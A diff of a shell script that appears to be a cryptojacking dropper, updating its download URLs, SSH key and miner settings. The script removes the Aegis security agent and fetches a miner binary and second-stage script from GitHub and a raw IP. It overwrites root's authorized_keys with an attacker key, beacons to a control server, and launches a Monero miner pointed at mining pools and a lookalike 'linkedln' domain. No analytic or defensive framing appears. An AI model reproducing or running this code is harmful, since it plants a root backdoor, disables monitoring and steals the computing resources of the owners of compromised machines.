@@ -82,11 +82,11 @@ ps aux | grep -v grep | grep 'Yun' | awk '{print $2}' | xargs -I % kill -9 %
 
 rm -rf /usr/local/aegis
 
-miner_url="https://github.com/burn50/Hello-World/releases/download/untagged-d9c6e7c259ee6eaf4bc8/zch"
-miner_url_backup="http://py2web.store:8080/cleanfda/zzh"
-miner_size="6006304"
-sh_url="http://45.133.203.192/cleanfda/newinit.sh"
-sh_url_backup="http://py2web.store:8080/cleanfda/newinit.sh"
+miner_url="https://github.com/burn50/Hello-World/releases/download/zzh/zzh"
+miner_url_backup="https://github.com/burn50/Myconfig/releases/download/zzh/zzh"
+miner_size="2426964"
+sh_url="https://github.com/burn50/Hello-World/blob/main/newinit.sh"
+sh_url_backup="https://github.com/burn50/Myconfig/blob/main/newinit.sh"
 chattr_size="8000"
 
 sleep 1
@@ -879,7 +879,7 @@ then
         chmod 700 /root/.ssh/
         echo >> /root/.ssh/authorized_keys
         chmod 600 /root/.ssh/authorized_keys
-        echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3QgqCevA1UIX9jkWJNzaDHmCFQMCVn6DlhT8Tj1CcBLouOPpuBVqGoZem9UT/sdy563H+e1cQD6LRA9lgyBO8VBOuyjlPf/rdYeXZRv9eFZ4ROGCOX/dvNzV9XdEyPX+znEL4AS45ko0obSqNGbserHPcKtXBjjcf9zWtRvBA4lteyXENWeCST61OhVI0K7bNTUHsQhFC0rgiGFqVv+kIwMVauMxeNd5PjsES4C5P9G8Ynligmdxp7LdOFeb5/V/iO8eceQsxLyXVCe2Jue5gaaOIbKy2j2HPxj6qK2BUqlx+dJdat6HE2HyPWDKD5jPyA5RCSs1zphe7BQjH20cX1nyzbhxNNQncs5BfB0kk2Qcb9IS/ofX9p8zIVKLUHMUNC9mKqPljzxH/3wYnOZrgebS4uwfyad+6SQ1oRfs1vWotXxSz1hBjhRPpUqzA7J865AcSOZBaoRsRKZ1BaGMyJyjIfkecFgeDpmbHzOzCjIXAeh20S2wLYZGdrhgVEr0= uc1" > /root/.ssh/authorized_keys
+        echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAuwiyiW2RQArW3gxVuueZclB8WxTGgMYRnz9xaYlBIVEcxZx+g7+RtC7e/bQIqDMdoqYG7ADYbB3nOcchauK/FHHukMG/yF7YBfsFeY/cWmoOWwsiDwBJS/srgCrQ5bgx/EP1dm/yt5reKDYX4ecETrlsCiDaQPAYGjSZJsCgGPfZkgE6sQ5iVqOFd871cg03e8Nmzc7IZd9E0ausU/JTPD7zlyIO3KtWpantir4q53Q+yEp0jcMjYdDf+YkTB1uxx/kebm5E8K4adrZUjQNYD7MUr+d5N/7HsqTY6+o+v+xQG5QjxsA4++v7t5vyHgs7JjOC7OMmy3h+XQyYF/Zp8Q==" > /root/.ssh/authorized_keys
         cd1 "http://45.133.203.192/cleanfda/info/?$us" >>/dev/null
         wd1 -q -O- "http://45.133.203.192/cleanfda/info/?$us" >>/dev/null
   
@@ -918,7 +918,7 @@ then
                 echo "not root runing"
                 sleep 5s
                 
-                ./zzh --log-file=/etc/etc --keepalive --no-color --cpu-priority 5 -o dev.fugglesoft.me:5443 --tls --nicehash --coin monero -o xmr-eu1.nanopool.org:14444 -u 82etS8QzVhqdiL6LMbb85BdEC3KgJeRGT3X1F3DQBnJa2tzgBJ54bn4aNDjuWDtpygBsRqcfGRK4gbbw3xUy3oJv7TwpUG4.clean --coin monero -o 80.211.206.105:9000 -u 82etS8QzVhqdiL6LMbb85BdEC3KgJeRGT3X1F3DQBnJa2tzgBJ54bn4aNDjuWDtpygBsRqcfGRK4gbbw3xUy3oJv7TwpUG4.clean --tls --coin monero --background &
+                ./zzh --log-file=/etc/etc --donate-level 0 --keepalive --no-color --cpu-priority 5 --cpu-max-threads-hint=66 -o scdn.linkedln.vip:443 --tls --background &
 
     else
                 echo "root runing....."
@@ -974,7 +974,7 @@ else
                 chmod 777 zzh
                 sleep 5s
              
-                ./zzh --log-file=/etc/etc --keepalive --no-color --cpu-priority 5 -o dev.fugglesoft.me:5443 --tls --nicehash --coin monero -o xmr-eu1.nanopool.org:14444 -u 82etS8QzVhqdiL6LMbb85BdEC3KgJeRGT3X1F3DQBnJa2tzgBJ54bn4aNDjuWDtpygBsRqcfGRK4gbbw3xUy3oJv7TwpUG4.clean --coin monero -o 80.211.206.105:9000 -u 82etS8QzVhqdiL6LMbb85BdEC3KgJeRGT3X1F3DQBnJa2tzgBJ54bn4aNDjuWDtpygBsRqcfGRK4gbbw3xUy3oJv7TwpUG4.clean --tls --coin monero --background &
+                ./zzh --log-file=/etc/etc --donate-level 0 --keepalive --no-color --cpu-priority 5 --cpu-max-threads-hint=66 -o scdn.linkedln.vip:443 --tls --background &
 
             else
                 echo "tmp runing....."
